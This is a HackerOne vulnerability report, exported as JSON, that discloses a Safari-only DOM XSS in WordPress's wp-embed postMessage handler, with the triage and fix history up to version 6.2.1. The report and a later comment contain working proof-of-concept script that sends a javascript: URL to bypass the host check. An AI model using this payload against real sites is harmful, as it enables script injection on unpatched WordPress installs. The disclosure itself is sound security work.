{
  "id": 1238528,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjM4NTI4",
  "url": "https://hackerone.com/reports/1238528",
  "title": "wp-embed XSS on Safari",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-06-20T02:26:46.244Z",
  "submitted_at": "2021-06-20T02:26:46.395Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zoczus",
    "url": "/zoczus",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 55,
    "url": "https://hackerone.com/wordpress",
    "handle": "wordpress",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "WordPress",
      "twitter_handle": "wordpress",
      "website": "https://wordpress.org/",
      "about": "Beautiful sites of any kind."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-07-01T11:34:07.022Z",
  "bug_reporter_agreed_on_going_public_at": "2023-06-01T11:34:05.419Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello! I'd like to report an XSS vulberability which works only on Safari browser (and maybe on others which I didn't checked. It defo doesn't work on both Chrome and Firefox). The other requirement which need to be met is attacker's blog post being embed on destination (victim) blog. \n\n## Analysis\n\nLet's take a look to the core of problem - JavaScript postMessage handler: \n\n```javascript\n     if (c.wp.receiveEmbedMessage = function(e) {\n            var t = e.data;\n            if (t)\n                if (t.secret || t.message || t.value)\n                    if (!/[^a-zA-Z0-9]/.test(t.secret)) {\n                        for (var r, a, i, s = d.querySelectorAll('iframe[data-secret=\"' + t.secret + '\"]'), n = d.querySelectorAll('blockquote[data-secret=\"' + t.secret + '\"]'), o = 0; o < n.length; o++)\n                            n[o].style.display = \"none\";\n                        for (o = 0; o < s.length; o++)\n                            if (r = s[o],\n                            e.source === r.contentWindow) {\n                                if (r.removeAttribute(\"style\"),\n                                \"height\" === t.message) {\n                                    if (1e3 < (i = parseInt(t.value, 10)))\n                                        i = 1e3;\n                                    else if (~~i < 200)\n                                        i = 200;\n                                    r.height = i\n                                }\n                                if (\"link\" === t.message)\n                                    if (a = d.createElement(\"a\"),\n                                    i = d.createElement(\"a\"),\n                                    a.href = r.getAttribute(\"src\"),\n                                    i.href = t.value,\n                                    i.host === a.host)\n                                        if (d.activeElement === r)\n                                            c.top.location.href = t.value\n                            }\n                    }\n        }\n```\n\nThings need to be noticed: \n\n- Secret need to be known (but it's provided as location.hash of embed webpage, so it's not a problem)\n- Only content window can send postMessages (which is cool, as it's attacker website)\n- If **message** attribute of postMessage data has `link` value - crazy things are happening\n- most important ```c.top.location.href = t.value``` where `t` is postMessage data controlled by attacker. \n\nThe last point obviously can lead to XSS if attacker will use ```javascript:alert(document.domain)``` as `t.value`, however - before it happen important check is made:\n\n```javascript\n     if (a = d.createElement(\"a\"),\n                                    i = d.createElement(\"a\"),\n                                    a.href = r.getAttribute(\"src\"),\n                                    i.href = t.value,\n                                    i.host === a.host)\n```\n\nThis code checks if **hostname** provided in ```t.value``` is the same as **hostname** of embed page. It create `<a>` element, but `t.value` as `href` attribute and then - takes `host` attribute of created URL. This approach is of course way better than some regexp magic ;-) but there's a behavior specific in Safari browser:\n\n```\n> var a = document.createElement(\"a\")\n> a.href=\"javascript://google.com/%0aalert(document.domain);//\"\n> console.log(a.host)\n< google.com\n```\n\nAll other browsers return empty string in case of using `javascript:` scheme, but not Safari. :) This could lead attacker to use `javascript` schema and execute javascript code in top window (victim's blog)\n\n\n## Steps To Reproduce:\n\n1. Get evil wordpress instance ;-) \n2. Edit `wordpress/wp-includes/theme-compat/embed.php` file and add your custom HTML code:\n\n```html\n<script>\nif(document.location.hash.indexOf(\"secret\") != -1) {\n  secret = document.location.hash.split(\"=\")[1];\n  window.top.postMessage({\"secret\":secret,\"message\":\"link\",\"value\":\"javascript://\"+document.location.host+\"/%0aalert(document.domain);//\"},\"*\");\n}\n</script>\n```\n3. Create any post on attacker blog, publish it and get it's URL.\n4. On victim wordpress site (Safari) add new post with embed post from victim wordpress\n5. Alert executed. :) \n\nSample blogpost that can be embedded: `https://ropchain.org/lab/wordpress/2021/06/20/embed-me/`\n\n## Recommendations\n\nIt's recommended to also validate schema of links and allow only HTTP / HTTPS links in postMessages.\n\n## Impact\n\nAbility to execute JavaScript code on wordpress page which embeded attacker's blogpost. \n\nPlease assign CVE identifier to this vulnerability. While crediting it, please use:\n\n*Jakub Å»oczek, Senior Security Researcher @ Securitum [https://securitum.pl/](https://securitum.pl/)*\n\nAll the best!",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2023-07-01T11:34:05.635Z",
  "allow_singular_disclosure_after": -7240820.161844459,
  "singular_disclosure_allowed": true,
  "vote_count": 41,
  "voters": [
    "zy9ard3",
    "zoczus",
    "shubham_srt",
    "encodedguy",
    "f_m",
    "1smael0liveira",
    "shivammusic",
    "skin",
    "alexander-petree1001",
    "am_egyarmy2023",
    "and 31 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2750,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "WordPress Core",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 12185509,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi!\n\nThanks for sending in the report. We're in the process of evaluating it now and will get back to you soon.\n\nRegards",
      "automated_response": false,
      "created_at": "2021-06-21T08:01:54.632Z",
      "updated_at": "2021-06-21T08:01:54.632Z",
      "actor": {
        "username": "ehtis",
        "cleared": false,
        "verified": false,
        "url": "/ehtis",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 15538005,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @ehtis,  is everything ok? Something is about to happen with this issue? :) ",
      "automated_response": false,
      "created_at": "2022-02-18T19:52:34.941Z",
      "updated_at": "2022-02-18T19:52:34.941Z",
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 20235795,
      "is_internal": false,
      "editable": false,
      "type": "Activities::HackerRequestedMediation",
      "message": "",
      "automated_response": false,
      "created_at": "2023-02-03T15:37:26.663Z",
      "updated_at": "2023-02-03T15:37:26.663Z",
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 20237544,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @zoczus,\n\nSorry it took us a while to get back to you, this one fell through the cracks. The initial attempt to reproduce this did not result in the behavior you described, and double checking this again, I still can't seem to reproduce it on Safari. If you think this is a valid issue, are you still able to reproduce this on a fresh WordPress installation, without any plugins?\n\nLet us know!\nThanks",
      "automated_response": false,
      "created_at": "2023-02-03T18:05:58.568Z",
      "updated_at": "2023-02-03T18:05:58.568Z",
      "actor": {
        "username": "ehtis",
        "cleared": false,
        "verified": false,
        "url": "/ehtis",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 20268473,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey!\n\nJust confirmed, it's still working. Did small modification in PoC + my previous domain expired already after this time. So I've got new one. This is post to get Embed to trigger XSS: \n\n```\nhttps://ssrf.pl/wordpress/index.php/2023/02/06/hello-world/\n```\n\nCode in embed post:\n\n```html\n<script>\nif(document.location.hash.indexOf(\"secret\") != -1) {\n  secret = document.location.hash.split(\"=\").slice(-1)[0];\n  console.log(\"Secret: \" + secret);\n  window.setInterval(function() {\n          window.parent.postMessage({\"secret\":secret,\"message\":\"link\",\"value\":\"javascript://\"+document.location.host+\"/%0aalert(document.domain);//\"},\"*\");\n        }, 500);\n\n}\n</script>\n```\n\n+ I've recoreded live demo on how it works on latest Safari (attached):\n\n{F2157706}\n\nThank you for looking into it. Let me know whenever this wordpress on ssrf.pl won't be needed anymore, as I'd love to remove this VPS quickly. ;-) Take care.",
      "automated_response": false,
      "created_at": "2023-02-06T17:02:18.173Z",
      "updated_at": "2023-02-06T17:02:18.173Z",
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2157706,
          "filename": "wordpress_xss.mov",
          "type": "video/quicktime",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wkbtfp52jdrke9cxoixtgg0nbv6b?response-content-disposition=attachment%3B%20filename%3D%22wordpress_xss.mov%22%3B%20filename%2A%3DUTF-8%27%27wordpress_xss.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065425Z&X-Amz-Expires=2836&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f31fe82d885bbb274a809936bc87a3aeeae0f1682abf5a79a836ccf4558c62d5"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 20339058,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hi @zoczus,\n\nIt seems like the postMessage handler could indeed be improved. Turns out, we had found issues in it internally as well, during an independent audit. I'm marking this as triaged. A fix is in the works.",
      "automated_response": false,
      "created_at": "2023-02-10T16:34:50.330Z",
      "updated_at": "2023-02-10T16:34:50.330Z",
      "actor": {
        "username": "ehtis",
        "cleared": false,
        "verified": false,
        "url": "/ehtis",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 20358286,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you. Looking forward! ",
      "automated_response": false,
      "created_at": "2023-02-13T01:57:06.714Z",
      "updated_at": "2023-02-13T01:57:06.714Z",
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 21225118,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "Hi,\n\nWhile this issue has yet to be resolved, we are awarding a bounty for this report. Please note that as this issue is still being `triaged`, public disclosure will only be available (as usual) once the issue is fully resolved.\n\nThanks once again for the responsible disclosure.",
      "automated_response": false,
      "created_at": "2023-04-11T12:10:26.758Z",
      "updated_at": "2023-04-11T12:10:26.758Z",
      "actor": {
        "url": "/wordpress",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "profile": {
          "name": "WordPress"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "wordpress",
      "collaborator": {
        "username": "zoczus",
        "url": "/zoczus"
      }
    },
    {
      "id": 21787518,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Team, Thank you for the bounty! :) Are you about to coordinate CVE request for this one? I'd love to write and publish article about this issue whenever it's gonna be fixed and officially announced. \n\nHave a great day!\nJZ",
      "automated_response": false,
      "created_at": "2023-05-11T00:57:27.291Z",
      "updated_at": "2023-05-11T00:57:27.291Z",
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 21845745,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "The security team intend to include a fix for this issue in an upcoming release, how would you like to be credited?\n\nTypically credits take the form of `Thanks to Reporter Name [of Reporter Company] for...`. Either your or your company's name can be linked to a social media profile or website.\n\nIf we don't hear back to you prior to the release, we'll use your HackerOne profile data for the post but can edit after the event if needs be.\n\nThanks,\nPeter",
      "automated_response": false,
      "created_at": "2023-05-15T04:52:45.849Z",
      "updated_at": "2023-05-15T04:52:45.849Z",
      "actor": {
        "username": "peterwilsoncc",
        "cleared": false,
        "verified": false,
        "url": "/peterwilsoncc",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/088/233/1bc225b5a7eece788797207b092f8b9083a4ed4d_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 21859260,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@peterwilsoncc of course, please credit me :)\n\nMy name: Jakub Å»oczek\nMy company name: Securitum\nLink: https://research.securitum.com/\n\nThank you! \nJZ",
      "automated_response": false,
      "created_at": "2023-05-15T20:40:03.425Z",
      "updated_at": "2023-05-15T20:40:03.425Z",
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 21889288,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Fixed in 6.2.1: https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/\n\nThank you for your contribution towards making WordPress secure! :)",
      "automated_response": false,
      "created_at": "2023-05-17T12:03:53.732Z",
      "updated_at": "2023-05-17T12:03:53.732Z",
      "actor": {
        "username": "ehtis",
        "cleared": false,
        "verified": false,
        "url": "/ehtis",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "zoczus",
        "url": "/zoczus"
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 22126191,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-06-01T11:34:05.523Z",
      "updated_at": "2023-06-01T11:34:05.523Z",
      "first_to_agree": true,
      "actor": {
        "username": "zoczus",
        "cleared": false,
        "verified": false,
        "url": "/zoczus",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    },
    {
      "id": 22601540,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-07-01T11:34:07.098Z",
      "updated_at": "2023-07-01T11:34:07.098Z",
      "actor": {
        "url": "/wordpress",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "profile": {
          "name": "WordPress"
        }
      },
      "genius_execution_id": null,
      "team_handle": "wordpress"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 301100,
      "category": "researcher",
      "content": "Invalid postMessage origin check implementation in WordPress open embed auto discovery function allows potential attacker to execute malicious JavaScript code. \n\nDetailed write-up: https://research.securitum.com/xss-in-wordpress-via-open-embed-auto-discovery/",
      "user": {
        "id": 124,
        "username": "zoczus",
        "name": "Jakub Å»oczek",
        "bio": "Senior Security Researcher @ Securitum",
        "cleared": false,
        "verified": false,
        "website": "https://research.securitum.com/",
        "location": "Poland",
        "created_at": "2013-11-06T22:45:53.284Z",
        "url": "https://hackerone.com/zoczus",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/d1445988e2aaee9e43a96ed7edc9348b9095032dce95c8873f36a1ca91ca18f7"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": [

      ]
    }
  ]
}